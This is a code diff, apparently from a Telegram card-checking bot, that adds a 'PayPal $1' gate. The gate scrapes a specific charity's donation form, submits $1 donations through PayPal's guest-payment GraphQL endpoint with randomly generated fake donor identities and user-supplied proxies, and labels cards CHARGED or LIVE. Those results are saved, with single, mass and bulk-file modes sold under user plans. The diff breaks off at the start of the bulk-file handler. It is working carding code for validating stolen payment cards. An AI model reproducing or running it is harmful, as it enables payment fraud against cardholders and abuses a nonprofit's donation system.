@@ -28,6 +28,7 @@ PROXY_FILE = "proxy.json"
 ACTIVE_MTXT_PROCESSES = {}
 TEMP_WORKING_SITES = {}  # Store working sites temporarily for /check command
 ACTIVE_RZP_PROCESSES = {}  # Store active Razorpay checking processes
+ACTIVE_PPTXT_PROCESSES = {}  # Store active PayPal TXT checking processes
 
 # Default Razorpay site
 DEFAULT_RZP_SITE = "https://pages.razorpay.com/pl_J1vTgGrsLKbLWy/view"
@@ -1425,10 +1426,21 @@ async def charge_callback(event):
 ⟐ <b>TXT Cmd</b>: <code>/mtxt</code>
 ⟐ <b>Status</b>: <code>Active ✅</code>
 ═══════════════════
+⟐ <b>Name</b>: <code>PayPal $1</code>
+⟐ <b>Command</b>: <code>/pp cc|mm|yy|cvv</code>
+⟐ <b>Mass Cmd</b>: <code>/mpp cc|mm|yy|cvv</code>
+⟐ <b>TXT Cmd</b>: <code>/pptxt</code>
+⟐ <b>Status</b>: <code>Active ✅</code>
+═══════════════════
 ⟐ <b>Name</b>: <code>Razorpay</code>
 ⟐ <b>Command</b>: <code>/rzp cc|mm|yy|cvv</code>
 ⟐ <b>Mass Cmd</b>: <code>/mrzp cc|mm|yy|cvv</code>
 ⟐ <b>TXT Cmd</b>: <code>/rztxt</code>
+⟐ <b>Status</b>: <code>Active ✅</code>
+═══════════════════
+⟐ <b>Name</b>: <code>Stripe Checkout</code>
+⟐ <b>Command</b>: <code>/co url cc|mm|yy|cvv</code>
+⟐ <b>BIN Gen</b>: <code>/co url BIN</code> (10 cards)
 ⟐ <b>Status</b>: <code>Active ✅</code>
 ═══════════════════
 ⟐ <b>Name</b>: <code>Random Sites</code>
@@ -1567,14 +1579,21 @@ async def cmds_charge_callback(event):
 ⟐ <b>TXT Cmd</b>: <code>/mtxt</code>
 ⟐ <b>Status</b>: <code>Active ✅</code>
 ═══════════════════
+⟐ <b>Name</b>: <code>PayPal $1</code>
+⟐ <b>Command</b>: <code>/pp cc|mm|yy|cvv</code>
+⟐ <b>Mass Cmd</b>: <code>/mpp cc|mm|yy|cvv</code>
+⟐ <b>TXT Cmd</b>: <code>/pptxt</code>
+⟐ <b>Status</b>: <code>Active ✅</code>
+═══════════════════
 ⟐ <b>Name</b>: <code>Razorpay</code>
 ⟐ <b>Command</b>: <code>/rzp cc|mm|yy|cvv</code>
 ⟐ <b>Mass Cmd</b>: <code>/mrzp cc|mm|yy|cvv</code>
 ⟐ <b>TXT Cmd</b>: <code>/rztxt</code>
 ⟐ <b>Status</b>: <code>Active ✅</code>
 ═══════════════════
-⟐ <b>Name</b>: <code>Random Sites</code>
-⟐ <b>Command</b>: <code>/ran</code> (TXT file)
+⟐ <b>Name</b>: <code>Stripe Checkout</code>
+⟐ <b>Command</b>: <code>/co url cc|mm|yy|cvv</code>
+⟐ <b>BIN Gen</b>: <code>/co url BIN</code> (10 cards)
 ⟐ <b>Status</b>: <code>Active ✅</code>
 ━ ━ ━ ━ ━━━ ━ ━ ━ ━
 ⟐ <b>Limit</b>: <code>As Per User's Plan</code>
@@ -1628,9 +1647,10 @@ async def cmds_txt_checker_callback(event):
     txt_text = """<pre>#Rvs3x 〔TXT File Checker〕</pre>
 ━ ━ ━ ━ ━━━ ━ ━ ━ ━
 <b>Available Gates:</b>
-⟐ <code>/mtxt</code>
-⟐ <code>/rztxt</code>
-⟐ <code>/autxt</code>
+⟐ <code>/mtxt</code> (Shopify)
+⟐ <code>/pptxt</code> (PayPal $1)
+⟐ <code>/rztxt</code> (Razorpay)
+⟐ <code>/autxt</code> (Stripe Auth)
 ━ ━ ━ ━ ━━━ ━ ━ ━ ━
 <b>Features:</b>
 ⟐ Upload TXT file with cards
@@ -2471,11 +2491,12 @@ async def clear_processes(event):
     if event.sender_id not in ADMIN_ID:
         return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
     
-    global ACTIVE_MTXT_PROCESSES, ACTIVE_RZP_PROCESSES, ACTIVE_STRIPE_PROCESSES
+    global ACTIVE_MTXT_PROCESSES, ACTIVE_RZP_PROCESSES, ACTIVE_STRIPE_PROCESSES, ACTIVE_PPTXT_PROCESSES
     
     # Clear all active processes
     ACTIVE_MTXT_PROCESSES.clear()
     ACTIVE_RZP_PROCESSES.clear()
+    ACTIVE_PPTXT_PROCESSES.clear()
     ACTIVE_STRIPE_PROCESSES.clear()
     
     await event.reply("```✅ 𝘼𝙡𝙡 𝙨𝙩𝙪𝙘𝙠 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙨 𝙘𝙡𝙚𝙖𝙧𝙚𝙙!```")
@@ -4386,6 +4407,624 @@ async def close_gen_callback(event):
         pass
 
 
+# ========== PAYPAL $1 CHARGE INTEGRATION ==========
+
+PP_FIRST_NAMES = [
+    "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
+    "William","Elizabeth","David","Barbara","Richard","Susan","Joseph","Jessica",
+    "Thomas","Sarah","Christopher","Karen","Daniel","Lisa","Matthew","Nancy",
+    "Anthony","Betty","Mark","Margaret","Donald","Sandra","Steven","Ashley",
+    "Paul","Dorothy","Andrew","Kimberly","Joshua","Emily","Kenneth","Donna"
+]
+
+PP_LAST_NAMES = [
+    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
+    "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
+    "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
+    "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker"
+]
+
+PP_ADDRESSES = [
+    {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
+    {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
+    {"line1": "456 Oak Avenue", "city": "Riverside", "state": "CA", "zip": "92501"},
+    {"line1": "789 Pine Road", "city": "Lakewood", "state": "CO", "zip": "80226"},
+    {"line1": "321 Elm Boulevard", "city": "Portland", "state": "OR", "zip": "97201"},
+    {"line1": "654 Cedar Lane", "city": "Austin", "state": "TX", "zip": "73301"},
+    {"line1": "987 Birch Drive", "city": "Denver", "state": "CO", "zip": "80201"},
+    {"line1": "147 Walnut Court", "city": "Phoenix", "state": "AZ", "zip": "85001"},
+    {"line1": "258 Spruce Way", "city": "Seattle", "state": "WA", "zip": "98101"},
+    {"line1": "369 Willow Place", "city": "Miami", "state": "FL", "zip": "33101"},
+]
+
+PP_PHONE_PREFIXES = ["212","310","312","415","602","713","206","305","404","503"]
+PP_EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]
+
+
+def pp_random_donor():
+    first = random.choice(PP_FIRST_NAMES)
+    last = random.choice(PP_LAST_NAMES)
+    addr = random.choice(PP_ADDRESSES)
+    phone = random.choice(PP_PHONE_PREFIXES) + ''.join([str(random.randint(0,9)) for _ in range(7)])
+    domain = random.choice(PP_EMAIL_DOMAINS)
+    email = f"{first.lower()}{random.randint(10,9999)}@{domain}"
+    return {"first": first, "last": last, "email": email, "phone": phone, "address": addr}
+
+
+def pp_detect_type(n):
+    n = n.replace(" ", "").replace("-", "")
+    if n.startswith("4"): return "VISA"
+    elif re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "MASTER_CARD"
+    elif n.startswith(("34", "37")): return "AMEX"
+    elif n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
+    return "VISA"
+
+
+def pp_analyze_response(paypal_text, approve_text=""):
+    t = paypal_text.upper() if paypal_text else ""
+
+    if 'APPROVESTATE":"APPROVED' in t:
+        return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Payment Approved!"}
+    if 'PARENTTYPE":"AUTH' in t and '"CARTID"' in t:
+        return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Auth Successful!"}
+    if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
+        return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED!"}
+
+    if 'CVV2_FAILURE' in t:
+        return {"status": "APPROVED", "emoji": "✅", "msg": "CVV2 FAILURE (Card is LIVE)"}
+    if 'INVALID_SECURITY_CODE' in t:
+        return {"status": "APPROVED", "emoji": "✅", "msg": "CCN - Invalid Security Code (LIVE)"}
+    if 'INVALID_BILLING_ADDRESS' in t:
+        return {"status": "APPROVED", "emoji": "✅", "msg": "AVS FAILED (LIVE)"}
+    if 'EXISTING_ACCOUNT_RESTRICTED' in t:
+        return {"status": "APPROVED", "emoji": "✅", "msg": "Account Restricted (LIVE)"}
+
+    if 'INSUFFICIENT_FUNDS' in t:
+        return {"status": "LIVE", "emoji": "💰", "msg": "Insufficient Funds (LIVE CARD)"}
+
+    combined = t + " " + (approve_text.upper() if approve_text else "")
+    declines = [
+        ('DO_NOT_HONOR', 'Do Not Honor'), ('ACCOUNT_CLOSED', 'Account Closed'),
+        ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'Account Locked/Closed'),
+        ('LOST_OR_STOLEN', 'LOST OR STOLEN'), ('SUSPECTED_FRAUD', 'SUSPECTED FRAUD'),
+        ('INVALID_ACCOUNT', 'INVALID ACCOUNT'), ('REATTEMPT_NOT_PERMITTED', 'REATTEMPT NOT PERMITTED'),
+        ('ACCOUNT_BLOCKED_BY_ISSUER', 'ACCOUNT BLOCKED BY ISSUER'),
+        ('ORDER_NOT_APPROVED', 'ORDER NOT APPROVED'),
+        ('PICKUP_CARD_SPECIAL_CONDITIONS', 'PICKUP CARD'),
+        ('PAYER_CANNOT_PAY', 'PAYER CANNOT PAY'), ('GENERIC_DECLINE', 'GENERIC DECLINE'),
+        ('COMPLIANCE_VIOLATION', 'COMPLIANCE VIOLATION'),
+        ('TRANSACTION_NOT_PERMITTED', 'TRANSACTION NOT PERMITTED'),
+        ('PAYMENT_DENIED', 'PAYMENT DENIED'), ('INVALID_TRANSACTION', 'INVALID TRANSACTION'),
+        ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED/INACTIVE ACCOUNT'),
+        ('SECURITY_VIOLATION', 'SECURITY VIOLATION'),
+        ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED - UPDATED ACCOUNT'),
+        ('INVALID_OR_RESTRICTED_CARD', 'INVALID/RESTRICTED CARD'),
+        ('EXPIRED_CARD', 'EXPIRED CARD'), ('CRYPTOGRAPHIC_FAILURE', 'CRYPTOGRAPHIC FAILURE'),
+        ('TRANSACTION_CANNOT_BE_COMPLETED', 'CANNOT BE COMPLETED'),
+        ('DECLINED_PLEASE_RETRY', 'DECLINED - RETRY LATER'),
+        ('TX_ATTEMPTS_EXCEED_LIMIT', 'TX ATTEMPTS EXCEED LIMIT'),
+    ]
+    for keyword, msg in declines:
+        if keyword in combined:
+            return {"status": "DECLINED", "emoji": "❌", "msg": msg}
+
+    try:
+        rj = json.loads(paypal_text)
+        if "errors" in rj:
+            return {"status": "DECLINED", "emoji": "❌", "msg": rj["errors"][0].get("message", "Unknown")}
+    except:
+        pass
+    try:
+        rj = json.loads(approve_text)
+        if rj.get("data", {}).get("error"):
+            return {"status": "DECLINED", "emoji": "❌", "msg": str(rj["data"]["error"])}
+    except:
+        pass
+
+    return {"status": "DECLINED", "emoji": "❌", "msg": "UNKNOWN ERROR"}
+
+
+async def pp_check_card(cc_str, proxy_str=None):
+    parts = re.split(r'[|:,]', cc_str.strip())
+    if len(parts) < 4:
+        return {"status": "ERROR", "emoji": "⚠️", "msg": "Invalid format (CC|MM|YY|CVV)"}
+
+    cc = parts[0].strip()
+    mm = parts[1].strip().zfill(2)
+    yy = parts[2].strip()
+    cvv = parts[3].strip()
+    if len(yy) == 2:
+        yy = "20" + yy
+
+    donor = pp_random_donor()
+    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+    ajax_headers = {
+        "User-Agent": ua, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9",
+        "Origin": "https://awwatersheds.org", "Referer": "https://awwatersheds.org/donate/",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+
+    proxy_url = None
+    if proxy_str:
+        p = proxy_str.split(':')
+        if len(p) == 4:
+            proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
+        elif len(p) == 2:
+            proxy_url = f"http://{p[0]}:{p[1]}"
+
+    timeout = aiohttp.ClientTimeout(total=25)
+    try:
+        connector = aiohttp.TCPConnector(limit=50, ssl=False)
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            async with session.get("https://awwatersheds.org/donate/",
+                                   headers={"User-Agent": ua}, proxy=proxy_url) as r:
+                html = await r.text()
+
+            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
+            if not h:
+                h = re.search(r'"base_hash":"(.*?)"', html)
+            if not h:
+                return {"status": "ERROR", "emoji": "⚠️", "msg": "Hash not found"}
+
+            form_hash = h.group(1)
+            pfx_m = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
+            id_m = re.search(r'name="give-form-id" value="(.*?)"', html)
+            if not pfx_m or not id_m:
+                return {"status": "ERROR", "emoji": "⚠️", "msg": "Form tokens not found"}
+
+            pfx = pfx_m.group(1)
+            form_id = id_m.group(1)
+
+            reg_data = {
+                "give-honeypot": "", "give-form-id-prefix": pfx, "give-form-id": form_id,
+                "give-form-title": "Sustainers Circle", "give-current-url": "https://awwatersheds.org/donate/",
+                "give-form-url": "https://awwatersheds.org/donate/", "give-form-hash": form_hash,
+                "give-price-id": "custom", "give-amount": "1.00", "payment-mode": "paypal-commerce",
+                "give_first": donor["first"], "give_last": donor["last"], "give_email": donor["email"],
+                "give-lake-affiliation": "Other", "give_action": "purchase",
+                "give-gateway": "paypal-commerce", "action": "give_process_donation", "give_ajax": "true"
+            }
+            async with session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
+                                    headers=ajax_headers, data=reg_data, proxy=proxy_url) as r:
+                if r.status != 200:
+                    return {"status": "ERROR", "emoji": "⚠️", "msg": "Donation registration failed"}
+
+            order_data = {
+                "give-honeypot": "", "give-form-id-prefix": pfx, "give-form-id": form_id,
+                "give-form-hash": form_hash, "payment-mode": "paypal-commerce",
+                "give-amount": "1.00", "give-gateway": "paypal-commerce",
+            }
+            async with session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
+                                    params={"action": "give_paypal_commerce_create_order"},
+                                    headers=ajax_headers, data=order_data, proxy=proxy_url) as r:
+                rj = await r.json()
+
+            if not (rj.get("success") and "data" in rj):
+                return {"status": "ERROR", "emoji": "⚠️", "msg": "PayPal order creation failed"}
+
+            order_id = rj["data"]["id"]
+
+            addr = donor["address"]
+            full_yy = yy
+            billing = {
+                "givenName": donor["first"], "familyName": donor["last"],
+                "line1": addr["line1"], "line2": None,
+                "city": addr["city"], "state": addr["state"],
+                "postalCode": addr["zip"], "country": "US"
+            }
+
+            graphql_h = {
+                "Host": "www.paypal.com", "Paypal-Client-Context": order_id,
+                "X-App-Name": "standardcardfields", "Paypal-Client-Metadata-Id": order_id,
+                "User-Agent": ua, "Content-Type": "application/json",
+                "Origin": "https://www.paypal.com",
+                "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
+                "X-Country": "US"
+            }
+
+            graphql_query = """
+            mutation payWithCard(
+                $token: String! $card: CardInput $paymentToken: String $phoneNumber: String
+                $firstName: String $lastName: String $shippingAddress: AddressInput
+                $billingAddress: AddressInput $email: String
+                $currencyConversionType: CheckoutCurrencyConversionType
+                $installmentTerm: Int $identityDocument: IdentityDocumentInput $feeReferenceId: String
+            ) {
+                approveGuestPaymentWithCreditCard(
+                    token: $token card: $card paymentToken: $paymentToken
+                    phoneNumber: $phoneNumber firstName: $firstName lastName: $lastName
+                    email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress
+                    currencyConversionType: $currencyConversionType installmentTerm: $installmentTerm
+                    identityDocument: $identityDocument feeReferenceId: $feeReferenceId
+                ) {
+                    flags { is3DSecureRequired }
+                    cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } }
+                    paymentContingencies {
+                        threeDomainSecure { status method redirectUrl { href } parameter }
+                    }
+                }
+            }
+            """
+
+            variables = {
+                "token": order_id,
+                "card": {
+                    "cardNumber": cc, "type": pp_detect_type(cc),
+                    "expirationDate": f"{mm}/{full_yy}",
+                    "postalCode": addr["zip"], "securityCode": cvv
+                },
+                "phoneNumber": donor["phone"], "firstName": donor["first"],
+                "lastName": donor["last"], "email": donor["email"],
+                "billingAddress": billing, "shippingAddress": billing,
+                "currencyConversionType": "PAYPAL"
+            }
+
+            async with session.post(
+                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
+                headers=graphql_h, json={"query": graphql_query, "variables": variables},
+                proxy=proxy_url
+            ) as r:
+                graphql_resp = await r.text()
+
+            approve_data = {
+                "give-honeypot": "", "give-form-id-prefix": pfx, "give-form-id": form_id,
+                "give-form-hash": form_hash, "payment-mode": "paypal-commerce",
+                "give-amount": "1.00", "give-gateway": "paypal-commerce",
+            }
+            async with session.post(
+                "https://awwatersheds.org/wp-admin/admin-ajax.php",
+                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
+                headers=ajax_headers, data=approve_data, proxy=proxy_url
+            ) as r:
+                approve_resp = await r.text()
+
+            return pp_analyze_response(graphql_resp, approve_resp)
+
+    except Exception as e:
+        return {"status": "ERROR", "emoji": "⚠️", "msg": str(e)[:100]}
+
+
+# --- PayPal $1 Bot Command Handlers ---
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]pp(?:\s|$)'))
+async def pp_handler(event):
+    can_access, access_type = await can_use(event.sender_id, event.chat)
+    if access_type == "banned": return await event.reply(banned_user_message())
+    if not can_access:
+        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
+        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)
+    asyncio.create_task(process_pp_card(event, access_type))
+
+
+async def process_pp_card(event, access_type):
+    try:
+        sender = await event.get_sender()
+        username = sender.username if sender.username else f"user_{event.sender_id}"
+    except:
+        username = f"user_{event.sender_id}"
+
+    proxy_data = await get_user_proxy(event.sender_id)
+    if not proxy_data:
+        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
+
+    card = None
+    is_premium = await is_premium_user(event.sender_id)
+    if event.reply_to_msg_id:
+        replied_msg = await event.get_reply_message()
+        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
+        if not card:
+            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /pp 4111111111111111|12|2025|123")
+    else:
+        card = extract_card(event.raw_text)
+        if not card:
+            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /pp 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤", parse_mode="markdown")
+
+    ip = proxy_data.get('ip')
+    port = proxy_data.get('port')
+    puser = proxy_data.get('username')
+    ppass = proxy_data.get('password')
+    proxy_str = f"{ip}:{port}:{puser}:{ppass}" if puser and ppass else f"{ip}:{port}"
+
+    loading_msg = await event.reply("🍳")
+    start_time = time.time()
+
+    async def animate_loading():
+        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
+        i = 0
+        while True:
+            try:
+                await loading_msg.edit(emojis[i % 5])
+                await asyncio.sleep(0.5)
+                i += 1
+            except: break
+
+    loading_task = asyncio.create_task(animate_loading())
+    try:
+        result = await pp_check_card(card, proxy_str)
+        loading_task.cancel()
+        end_time = time.time()
+        elapsed_time = round(end_time - start_time, 2)
+        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
+
+        s = result["status"]
+        is_charged = False
+        if s == "CHARGED":
+            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
+            is_charged = True
+            await save_approved_card(card, "CHARGED", result["msg"], "PayPal $1", "$1.00")
+        elif s in ("APPROVED", "LIVE"):
+            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
+            await save_approved_card(card, "APPROVED", result["msg"], "PayPal $1", "$1.00")
+        else:
+            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
+
+        msg = f"""{status_header}
+
+𝗖𝗖 ⇾ `{card}`
+𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ PayPal $1
+𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result["msg"]}
+𝗣𝗿𝗶𝗰𝗲 ⇾ $1.00 💸
+
+```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
+𝗕𝗮𝗻𝗸: {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
+
+𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨"""
+        await loading_msg.delete()
+        result_msg = await event.reply(msg)
+        if is_charged: await pin_charged_message(event, result_msg)
+    except Exception as e:
+        loading_task.cancel()
+        await loading_msg.delete()
+        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]mpp(?:\s|$)'))
+async def mpp_handler(event):
+    can_access, access_type = await can_use(event.sender_id, event.chat)
+    if access_type == "banned": return await event.reply(banned_user_message())
+    if not can_access:
+        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]]
+        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)
+
+    proxy_data = await get_user_proxy(event.sender_id)
+    if not proxy_data:
+        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
+
+    cards = []
+    is_premium = await is_premium_user(event.sender_id)
+    if event.reply_to_msg_id:
+        replied_msg = await event.get_reply_message()
+        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
+        if not cards:
+            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙥𝙥 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
+    else:
+        cards = extract_all_cards(event.raw_text)
+        if not cards:
+            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙥𝙥 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨")
+
+    user_limit = get_cc_limit(access_type, event.sender_id)
+    if len(cards) > user_limit:
+        cards = cards[:user_limit]
+        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {user_limit} 𝙘𝙖𝙧𝙙𝙨. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {user_limit} 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙧 /𝙢𝙥𝙥.```")
+
+    ip = proxy_data.get('ip')
+    port = proxy_data.get('port')
+    puser = proxy_data.get('username')
+    ppass = proxy_data.get('password')
+    proxy_str = f"{ip}:{port}:{puser}:{ppass}" if puser and ppass else f"{ip}:{port}"
+
+    asyncio.create_task(process_mpp_cards(event, cards, proxy_str))
+
+
+async def process_mpp_cards(event, cards, proxy_str):
+    try:
+        sender = await event.get_sender()
+        username = sender.username if sender.username else f"user_{event.sender_id}"
+    except:
+        username = f"user_{event.sender_id}"
+
+    sent_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 {len(cards)} 𝙏𝙤𝙩𝙖𝙡.```")
+
+    for i, card in enumerate(cards):
+        start_time = time.time()
+        result = await pp_check_card(card, proxy_str)
+        end_time = time.time()
+        elapsed_time = round(end_time - start_time, 2)
+        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
+
+        s = result["status"]
+        is_charged = False
+        if s == "CHARGED":
+            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
+            is_charged = True
+            await save_approved_card(card, "CHARGED", result["msg"], "PayPal $1", "$1.00")
+        elif s in ("APPROVED", "LIVE"):
+            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
+            await save_approved_card(card, "APPROVED", result["msg"], "PayPal $1", "$1.00")
+        else:
+            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
+
+        card_msg = f"""{status_header}
+
+𝗖𝗖 ⇾ `{card}`
+𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ PayPal $1
+𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result["msg"]}
+𝗣𝗿𝗶𝗰𝗲 ⇾ $1.00 💸
+
+```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
+𝗕𝗮𝗻𝗸: {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
+
+𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
+"""
+        result_msg = await event.reply(card_msg)
+        if is_charged: await pin_charged_message(event, result_msg)
+        await asyncio.sleep(0.1)
+
+    await sent_msg.edit(f"```✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {len(cards)} 𝙘𝙖𝙧𝙙𝙨.```")
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]pptxt(?:\s|$)'))
+async def pptxt_handler(event):
